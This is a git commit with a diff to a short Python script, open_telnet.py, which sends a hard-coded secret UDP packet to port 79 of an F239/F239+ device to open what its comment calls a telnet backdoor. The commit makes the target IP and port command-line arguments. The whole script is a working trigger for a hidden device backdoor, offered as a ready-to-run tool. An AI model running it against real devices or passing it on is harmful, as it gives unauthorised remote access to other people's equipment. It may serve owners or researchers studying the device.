dc0096e3e0e0b5ebfcceed19a2cee943e479adca
Stylon Wang <wangstylon@gmail.com>
2016-02-02 10:12:32 +0800

    Now accepts IP address and port as command line arguments
    	modified:   open_telnet.py

--- open_telnet/open_telnet.py
+++ open_telnet/open_telnet.py
@@ -1,17 +1,29 @@
 #!/usr/bin/python
+#
+# Sending secret password to F239/F239+ to open up telnet backdoor
+#
 import socket
 import sys
+
+if len(sys.argv) < 2 :
+    print >>sys.stderr, 'Usage: ', sys.argv[0], 'IP-address [port]'
+    exit(0)
+
+server_ip = sys.argv[1]
+server_port = 79
+if len(sys.argv) > 2 :
+    server_port = int(sys.argv[2])
 
 # Create a UDP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-server_address = ('10.1.9.59', 79)
+server_address = (server_ip, server_port)
 secret = "\x84\x37\x59"
 
+print >>sys.stderr, 'Sending to ', server_ip, server_port
 try:
-        # Send data
-        sent = sock.sendto(secret, server_address)
+    # Send data
+    sent = sock.sendto(secret, server_address)
 
 finally:
-        print >>sys.stderr, 'closing socket'
-        sock.close()
+    sock.close()
